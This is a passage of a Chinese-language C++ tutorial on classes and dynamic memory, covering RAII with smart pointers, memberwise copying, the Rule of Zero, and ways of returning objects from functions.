&lt;&lt; <span class="string">&quot;Failed to create Problematic object.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>更好的方法:</strong> 使用 RAII（资源获取即初始化）原则，例如使用智能指针（如 <code>std::unique_ptr</code>）来管理动态内存。智能指针会在其自身被销毁时自动释放所管理的内存，即使发生异常导致栈展开，也能保证资源被释放。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt; // for std::unique_ptr</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BetterClass</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="keyword">int</span>[]&gt; data1; <span class="comment">// 使用智能指针管理数组</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="keyword">char</span>[]&gt; data2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    BetterClass(<span class="keyword">size_t</span> n1, <span class="keyword">size_t</span> n2)</span><br><span class="line">        : data1(<span class="keyword">new</span> <span class="keyword">int</span>[n1]), data2(<span class="keyword">new</span> <span class="keyword">char</span>[n2]) <span class="comment">// 直接在初始化列表中分配</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BetterClass constructed.\n&quot;</span>;</span><br><span class="line">        <span class="comment">// 如果 new 失败，异常会抛出，已成功构造的 unique_ptr (如果有) 会自动释放内存</span></span><br><span class="line">        <span class="comment">// 不需要 try-catch 来手动 delete</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 不需要显式析构函数来 delete data1/data2，unique_ptr 会自动处理</span></span><br><span class="line">    <span class="comment">// 但仍然需要遵循 Rule of Three/Five/Zero (使用 unique_ptr 通常遵循 Rule of Zero)</span></span><br><span class="line">    ~BetterClass() &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BetterClass destructed.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 可能需要自定义复制/移动操作，或者禁用它们，因为 unique_ptr 默认不可复制</span></span><br><span class="line">    BetterClass(<span class="keyword">const</span> BetterClass&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">    BetterClass&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> BetterClass&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">    <span class="comment">// 可以添加移动操作</span></span><br><span class="line">    BetterClass(BetterClass&amp;&amp;) = <span class="keyword">default</span>;</span><br><span class="line">    BetterClass&amp; <span class="keyword">operator</span>=(BetterClass&amp;&amp;) = <span class="keyword">default</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="12-3-2-包含类成员的类的逐成员复制"><a href="#12-3-2-包含类成员的类的逐成员复制" class="headerlink" title="12.3.2 包含类成员的类的逐成员复制"></a>12.3.2 包含类成员的类的逐成员复制</h3><p>当一个类（称为<strong>包含类</strong>或<strong>容器类</strong>）包含其他类的对象作为其成员时，默认的复制构造函数和赋值运算符的行为仍然是<strong>成员逐一复制</strong>。</p><p>这意味着对于容器类中的<strong>每个成员</strong>：</p><ul><li>  如果是内置类型（<code>int</code>, <code>double</code>, 指针等），则按值复制。</li><li>  如果是<strong>类对象</strong>，则调用该成员对象的<strong>复制构造函数</strong>（对于容器的复制构造）或<strong>赋值运算符</strong>（对于容器的赋值运算）。</li></ul><p><strong>示例:</strong></p><p>假设我们有一个 <code>Gadget</code> 类，它包含一个我们之前改进过的 <code>String</code> 对象（来自 <code>string1.h</code>）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gadget.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> GADGET_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GADGET_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string1.h&quot;</span> <span class="comment">// 包含改进的 String 类</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Gadget</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    String name; <span class="comment">// 成员是 String 对象</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Gadget(<span class="keyword">const</span> <span class="keyword">char</span> * s = <span class="string">&quot;Default Gadget&quot;</span>, <span class="keyword">int</span> i = <span class="number">0</span>) : name(s), id(i) &#123;&#125;</span><br><span class="line">    Gadget(<span class="keyword">const</span> String&amp; s, <span class="keyword">int</span> i = <span class="number">0</span>) : name(s), id(i) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// *** 没有显式定义复制构造函数和赋值运算符 ***</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ID: &quot;</span> &lt;&lt; id &lt;&lt; <span class="string">&quot;, Name: &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// GADGET_H_</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;gadget.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Gadget <span class="title">g1</span><span class="params">(<span class="string">&quot;Flux Capacitor&quot;</span>, <span class="number">121</span>)</span></span>;</span><br><span class="line">    g1.show();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- Copying g1 to g2 ---\n&quot;</span>;</span><br><span class="line">    Gadget g2 = g1; <span class="comment">// 调用 Gadget 的默认复制构造函数</span></span><br><span class="line">    g2.show();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- Assigning g1 to g3 ---\n&quot;</span>;</span><br><span class="line">    Gadget g3; <span class="comment">// 调用 Gadget 默认构造函数 (name 会调用 String 默认构造函数)</span></span><br><span class="line">    g3.show();</span><br><span class="line">    g3 = g1; <span class="comment">// 调用 Gadget 的默认赋值运算符</span></span><br><span class="line">    g3.show();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- End of main ---\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// g1, g2, g3 的析构函数被调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>发生了什么？</strong></p><ol><li><p><strong><code>Gadget g2 = g1;</code> (默认复制构造函数):</strong></p><ul><li>  编译器生成的 <code>Gadget</code> 复制构造函数会执行成员逐一复制。</li><li>  对于 <code>int id</code> 成员：<code>g2.id</code> 被设置为 <code>g1.id</code> 的值 (121)。</li><li>  对于 <code>String name</code> 成员：调用 <code>String</code> 类的<strong>复制构造函数</strong> <code>String(const String&amp;)</code> 来初始化 <code>g2.name</code>，使用 <code>g1.name</code> 作为源。因为我们的 <code>String</code> 类有正确的深复制构造函数，所以 <code>g2.name</code> 会获得 <code>g1.name</code> 内容的独立副本。</li></ul></li><li><p><strong><code>g3 = g1;</code> (默认赋值运算符):</strong></p><ul><li>  编译器生成的 <code>Gadget</code> 赋值运算符会执行成员逐一赋值。</li><li>  对于 <code>int id</code> 成员：<code>g3.id</code> 被设置为 <code>g1.id</code> 的值。</li><li>  对于 <code>String name</code> 成员：调用 <code>String</code> 类的<strong>赋值运算符</strong> <code>operator=(const String&amp;)</code>，将 <code>g1.name</code> 赋给 <code>g3.name</code> (<code>g3.name = g1.name;</code>)。因为 <code>String</code> 类有正确的深复制赋值运算符（它会先释放 <code>g3.name</code> 的旧内存，然后分配新内存并复制内容），所以赋值操作是安全的。</li></ul></li></ol><p><strong>结论:</strong></p><p>如果一个类包含其他类的对象作为成员，并且这些成员对象所属的类<strong>已经正确地实现了它们自己的复制控制</strong>（即它们能安全地进行深复制和内存管理，像我们的 <code>String</code> 类或标准库类 <code>std::string</code>, <code>std::vector</code> 等），那么对于这些成员来说，包含类的默认成员逐一复制行为通常是<strong>足够且安全</strong>的。</p><p>但是，如果包含类<strong>本身</strong>还直接管理<strong>其他</strong>动态内存（例如，<code>Gadget</code> 类除了 <code>String name</code> 之外，还有一个 <code>int* extra_data</code> 指针，并且 <code>Gadget</code> 负责 <code>new/delete</code> 这个指针），那么这个包含类<strong>仍然需要</strong>提供自己的自定义复制构造函数和赋值运算符来处理 <code>extra_data</code> 的深复制，即使 <code>String name</code> 成员的复制可以由 <code>String</code> 类自己处理。</p><p>这就是<strong>零法则 (Rule of Zero)</strong> 发挥作用的地方：如果你的类只使用那些自身能正确管理资源的成员（如 <code>std::string</code>, <code>std::vector</code>, <code>std::unique_ptr</code> 等），并且不直接进行手动的 <code>new/delete</code>，那么你通常不需要提供任何自定义的析构函数、复制/移动构造函数或赋值运算符，编译器生成的默认版本就能很好地工作。</p><h2 id="12-4-有关返回对象的说明"><a href="#12-4-有关返回对象的说明" class="headerlink" title="12.4 有关返回对象的说明"></a>12.4 有关返回对象的说明</h2><p>当函数或方法需要返回一个类对象时，有几种不同的方式可以实现，每种方式都有其适用的场景和潜在的效率或安全 implications。主要的方式包括：返回指向对象的引用（<code>const</code> 或非 <code>const</code>）和返回对象本身（按值返回，<code>const</code> 或非 <code>const</code>）。</p><h3 id="12-4-1-返回指向-const-对象的引用"><a href="#12-4-1-返回指向-const-对象的引用" class="headerlink" title="12.4.1 返回指向 const 对象的引用"></a>12.4.1 返回指向 const 对象的引用</h3><p><strong>语法:</strong> <code>const ClassName &amp; functionName(parameters);</code></p><p><strong>何时使用:</strong><br>当函数需要返回一个<strong>已经存在</strong>的对象（例如，类的成员、通过引用传递给函数的对象），并且<strong>不希望</strong>调用者通过返回的引用修改这个对象时。</p><p><strong>优点:</strong></p><ul><li>  <strong>高效:</strong> 避免了创建对象的副本。返回的只是对象的地址（引用）。</li><li>  <strong>安全:</strong> <code>const</code> 保证了调用者不能意外地修改返回的对象。</li></ul><p><strong>缺点/注意事项:</strong></p><ul><li>  <strong>不能返回局部对象的引用:</strong> 函数不能返回在函数内部创建的局部变量的引用。当函数结束时，局部变量会被销毁，返回的引用将成为**悬挂引用 (dangling reference)**，访问它会导致未定义行为。</li><li>  返回的对象必须在函数调用结束后仍然存在。</li></ul><p><strong>示例:</strong><br>假设我们有一个 <code>Store</code> 类，包含多个 <code>Product</code> 对象，我们想提供一个方法来通过 ID 获取某个产品的信息，但不允许修改它。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Product</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="keyword">double</span> price;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Product(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; n = <span class="string">&quot;N/A&quot;</span>, <span class="keyword">double</span> p = <span class="number">0.0</span>) : name(n), price(p) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;: $&quot;</span> &lt;&lt; price; &#125;</span><br><span class="line">    <span class="comment">// ... 其他方法 ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Store</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Product&gt; products;</span><br><span class="line">    Product defaultProduct; <span class="comment">// 用于找不到时返回</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... 方法添加产品 ...</span></span><br><span class="line">    <span class="comment">// 通过 ID 查找产品，返回 const 引用</span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> Product &amp; <span class="title">findProductById</span><span class="params">(<span class="keyword">int</span> id)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (id &gt;= <span class="number">0</span> &amp;&amp; id &lt; products.size()) &#123;</span><br><span class="line">            <span class="keyword">return</span> products[id]; <span class="comment">// 返回 vector 中已存在对象的 const 引用</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> defaultProduct; <span class="comment">// 返回一个已存在的默认对象的 const 引用</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 错误示例：</span></span><br><span class="line">        <span class="comment">// Product temp(&quot;Temporary&quot;, 0.0);</span></span><br><span class="line">        <span class="comment">// return temp; // 错误！不能返回局部变量的引用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Store myStore;</span><br><span class="line">    <span class="comment">// ... 添加产品到 myStore ...</span></span><br><span class="line">    <span class="keyword">const</span> Product &amp; found = myStore.findProductById(<span class="number">1</span>); <span class="comment">// 高效，无复制</span></span><br><span class="line">    found.show(); <span class="comment">// OK: 调用 const 方法</span></span><br><span class="line">    <span class="comment">// found.setPrice(9.99); // 错误！不能通过 const 引用调用非 const 方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-4-2-返回指向非-const-对象的引用"><a href="#12-4-2-返回指向非-const-对象的引用" class="headerlink" title="12.4.2 返回指向非 const 对象的引用"></a>12.4.2 返回指向非 const 对象的引用</h3><p><strong>语法:</strong> <code>ClassName &amp; functionName(parameters);</code></p><p><strong>何时使用:</strong><br>当函数需要返回一个<strong>已经存在</strong>的对象，并且<strong>允许</strong>调用者通过返回的引用<strong>修改</strong>这个对象时。最常见的例子是重载某些运算符，如 <code>[]</code> (下标) 或 <code>+=</code> (复合赋值)。</p><p><strong>优点:</strong></p><ul><li>  <strong>高效:</strong> 同样避免了创建对象的副本。</li><li>  <strong>允许修改:</strong> 可以用于实现链式调用或允许直接修改返回的对象。</li></ul><p><strong>缺点/注意事项:</strong></p><ul><li>  <strong>不能返回局部对象的引用:</strong> 与返回 <code>const</code> 引用一样，绝对不能返回函数内部局部变量的引用。</li><li>  <strong>破坏封装 (可能):</strong> 如果返回的是类内部私有成员的非 <code>const</code> 引用，可能会破坏类的封装性，允许外部代码直接修改内部状态，应谨慎使用。</li></ul><p><strong>示例:</strong><br>重载 <code>String</code> 类的下标运算符 <code>[]</code>，允许修改字符。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 String 类中 (来自 string1.h)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">String</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 返回非 const 引用，允许修改</span></span><br><span class="line">    <span class="keyword">char</span> &amp; <span class="keyword">operator</span>[](<span class="keyword">int</span> i);</span><br><span class="line">    <span class="comment">// 返回 const 引用，用于 const 对象</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> &amp; <span class="keyword">operator</span>[](<span class="keyword">int</span> i) <span class="keyword">const</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现</span></span><br><span class="line"><span class="keyword">char</span> &amp; String::<span class="keyword">operator</span>[](<span class="keyword">int</span> i) &#123;</span><br><span class="line">    <span class="keyword">return</span> str[i]; <span class="comment">// 返回内部 char 数组元素的引用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> &amp; String::<span class="keyword">operator</span>[](<span class="keyword">int</span> i) <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> str[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="function">String <span class="title">greeting</span><span class="params">(<span class="string">&quot;Hello&quot;</span>)</span></span>;</span><br><span class="line">greeting[<span class="number">0</span>] = <span class="string">&#x27;J&#x27;</span>; <span class="comment">// OK: 通过返回的引用修改了第一个字符</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; greeting &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 输出 Jello</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> String <span class="title">constGreeting</span><span class="params">(<span class="string">&quot;Hi&quot;</span>)</span></span>;</span><br><span class="line"><span class="keyword">char</span> firstChar = constGreeting[<span class="number">0</span>]; <span class="comment">// OK: 读取字符</span></span><br><span class="line"><span class="comment">// constGreeting[0] = &#x27;B&#x27;; // 错误！不能修改 const 对象</span></span><br></pre></td></tr></table></figure><p>另一个例子是 <code>operator+=</code>，它修改对象自身并返回自身的引用以支持链式操作（虽然链式赋值不常见）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 Time 类中</span></span><br><span class="line">Time&amp; Time::<span class="keyword">operator</span>+=(<span class="keyword">const</span> Time&amp; t) &#123;</span><br><span class="line">    <span class="comment">// ... 实现加法逻辑，修改 *this ...</span></span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>; <span class="comment">// 返回调用对象自身的引用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-4-3-返回对象-按值返回"><a href="#12-4-3-返回对象-按值返回" class="headerlink" title="12.4.3 返回对象 (按值返回)"></a>12.4.3 返回对象 (按值返回)</h3><p><strong>语法:</strong> <code>ClassName functionName(parameters);</code></p><p><strong>何时使用:</strong><br>当函数需要返回一个<strong>新创建的对象</strong>（在函数内部计算或构造得到），或者需要返回一个现有对象的<strong>副本</strong>而不是其本身时。这是最常见和最安全的返回对象的方式，特别是对于局部对象。</p><p><strong>优点:</strong></p><ul><li>  <strong>安全:</strong> 不会返回悬挂引用。返回的是一个独立的副本（或移动后的对象）。</li><li>  <strong>简单:</strong> 易于理解和实现。</li></ul><p><strong>缺点/注意事项:</strong></p><ul><li>  <strong>可能有效率开销:</strong> 传统上，按值返回会调用<strong>复制构造函数</strong>来创建返回值的副本，这可能涉及大量数据的复制和内存分配/释放，效率较低。</li><li>  <strong>返回值优化 (RVO/NRVO):</strong> 现代 C++ 编译器通常会应用<strong>返回值优化 (Return Value Optimization, RVO)</strong> 或<strong>命名返回值优化 (Named Return Value Optimization, NRVO)**。这些优化可以</strong>完全避免**复制构造函数的调用，直接在调用者指定的内存位置上构造返回的对象，从而大大提高按值返回的效率。</li><li>  <strong>移动语义 (C++11):</strong> 如果 RVO/NRVO 不适用，但类有<strong>移动构造函数</strong>，编译器可能会选择调用移动构造函数而不是复制构造函数来转移资源所有权，这也比深复制高效得多。</li></ul><p><strong>示例:</strong><br>重载 <code>Vector</code> 类的 <code>+</code> 运算符。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 Vector 类中</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vector</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 按值返回一个新的 Vector 对象</span></span><br><span class="line">    Vector <span class="keyword">operator</span>+(<span class="keyword">const</span> Vector &amp; b) <span class="keyword">const</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现</span></span><br><span class="line">Vector Vector::<span class="keyword">operator</span>+(<span class="keyword">const</span> Vector &amp; b) <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="comment">// 方法 1: 创建命名对象并返回 (可能触发 NRVO)</span></span><br><span class="line">    <span class="function">Vector <span class="title">sum</span><span class="params">(x + b.x, y + b.y)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法 2: 直接返回临时对象 (可能触发 RVO)</span></span><br><span class="line">    <span class="comment">// return Vector(x + b.x, y + b.y);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line">Vector v1(1, 2), v2(3, 4);</span><br><span class="line">Vector v3 = v1 + v2; <span class="comment">// v1 + v2 返回一个临时 Vector 对象</span></span><br><span class="line">                     <span class="comment">// 这个临时对象被用来初始化 v3 (可能通过 RVO/NRVO 或移动/复制构造)</span></span><br></pre></td></tr></table></figure><p>由于 RVO/NRVO 和移动语义的存在，按值返回在现代 C++ 中通常是高效且推荐的方式，特别是对于那些表示“值”而非“身份”的类型。</p><h3 id="12-4-4-返回-const-对象-按值返回"><a href="#12-4-4-返回-const-对象-按值返回" class="headerlink" title="12.4.4 返回 const 对象 (按值返回)"></a>12.4.4 返回 const 对象 (按值返回)</h3><p><strong>语法:</strong> <code>const ClassName functionName(parameters);</code></p><p><strong>何时使用:</strong><br>这是一种不太常见的返回方式。它按值返回一个对象，但这个返回的临时对象是 <code>const</code> 的。</p><p><strong>优点:</strong></p><ul><li>  <strong>阻止对返回的临时对象调用非 const 方法:</strong> 如果一个函数按值返回一个对象，调用者可以立即对这个返回的临时对象调用其成员函数。如果返回类型是 <code>const ClassName</code>，则只能调用该对象的 <code>const</code> 成员函数。</li></ul><p><strong>缺点/注意事项:</strong></p><ul><li>  <strong>通常意义不大:</strong> 对于类类型，将按值返回的对象声明为 <code>const</code> 通常没什么必要。因为返回的是一个临时对象（右值），对其进行修改通常没有意义，而且 C++11 的移动语义通常更关心对象是否是右值，而不是它是否 <code>const</code>。在某些情况下，返回 <code>const</code> 对象甚至可能<strong>阻止移动语义</strong>的应用，导致不必要的复制。</li><li>  对于内置类型（如 <code>int</code>），返回 <code>const int</code> 几乎没有任何作用。</li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String temp = <span class="string">&quot;Temporary Name&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> temp; <span class="comment">// 返回 const String 对象</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// getName()[0] = &#x27;X&#x27;; // 错误！不能对返回的 const 临时对象调用非 const 的 operator[]</span></span><br><span class="line">    <span class="keyword">char</span> first = getName()[<span class="number">0</span>]; <span class="comment">// OK: 调用 const 的 operator[]</span></span><br><span class="line"></span><br><span class="line">    String nameCopy = getName(); <span class="comment">// OK: const 临时对象可以用来初始化非 const 对象 (通过复制/移动构造)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总的来说，除非有非常特殊的原因需要阻止对返回的临时对象调用非 <code>const</code> 方法，否则<strong>通常不推荐</strong>按值返回 <code>const</code> 对象。直接按值返回非 <code>const</code> 对象通常更灵活，并且更能受益于 RVO 和移动语义。</p><p><strong>总结:</strong></p><ul><li>  <strong>返回引用 (<code>&amp;</code> 或 <code>const &amp;</code>):</strong> 高效，无复制。用于返回<strong>已存在的</strong>、生命周期足够长的对象。<strong>绝不能</strong>返回局部变量的引用。<code>const &amp;</code> 更安全，<code>&amp;</code> 允许修改。</li><li>  <strong>按值返回 (<code>ClassName</code>):</strong> 安全，返回副本或移动后的对象。适用于返回函数内创建的新对象。效率通常由 RVO/NRVO 和移动语义保证。</li><li>  <strong>按值返回 <code>const</code> 对象 (<code>const ClassName</code>):</strong> 不常用，可能阻止对临时对象的修改，但通常意义不大，甚至可能影响优化。</li></ul><h2 id="12-5-使用指向对象的指针"><a href="#12-5-使用指向对象的指针" class="headerlink" title="12.5 使用指向对象的指针"></a>12.5 使用指向对象的指针</h2><p>就像可以使用指向内置类型（如 <code>int*</code>）或结构（如 <code>MyStruct*</code>）的指针一样，也可以声明和使用指向<strong>类对象</strong>的指针。指针本身存储的是对象的内存地址。</p><p><strong>声明指向对象的指针:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassName * pointerName;</span><br></pre></td></tr></table></figure><p>例如，要声明一个指向 <code>String</code> 对象的指针：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 